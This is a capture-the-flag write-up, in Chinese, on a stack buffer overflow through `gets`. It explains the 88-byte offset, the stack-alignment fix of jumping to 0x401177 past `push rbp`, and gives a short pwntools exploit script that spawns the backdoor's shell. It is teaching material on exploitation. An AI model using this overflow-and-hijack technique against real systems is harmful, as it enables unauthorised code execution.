# no_more_gets

## 题目简述

程序使用不检查长度的 `gets` 向栈缓冲区读入数据，并保留了调用 `system` 的后门函数。利用目标是覆盖返回地址跳到后门；额外难点是 x86-64 System V ABI 的 16 字节栈对齐。

## 解题过程

从缓冲区到保存的返回地址共 88 字节，因此基本载荷是 88 字节填充加后门地址。若直接返回到函数入口 `0x401176`，后门序言中的 `push rbp` 会让后续调用 `system` 时的栈错位，glibc 最终在要求 16 字节对齐的 `movaps` 指令处触发 SIGSEGV。

后门入口后一字节 `0x401177` 正好跳过 `push rbp`。这样既能执行后门主体，也能恢复 `system` 所需的栈对齐：

```python
from pwn import cyclic, p64, remote

io = remote("host", 10000)
backdoor_without_push_rbp = 0x401177

payload = cyclic(88) + p64(backdoor_without_push_rbp)
io.sendlineafter(b".\n", payload)
io.interactive()
```

也可以在 ROP 链前插入一个单独的 `ret` gadget 来改变 `rsp` 的奇偶槽位；两种方法本质相同。

## 方法总结

栈溢出覆盖偏移只是第一步。x86-64 下若 ROP 最终调用 libc 函数，还应检查进入函数时的 `rsp` 对齐；“本地能劫持控制流但在 `movaps` 崩溃”通常就是这一问题。
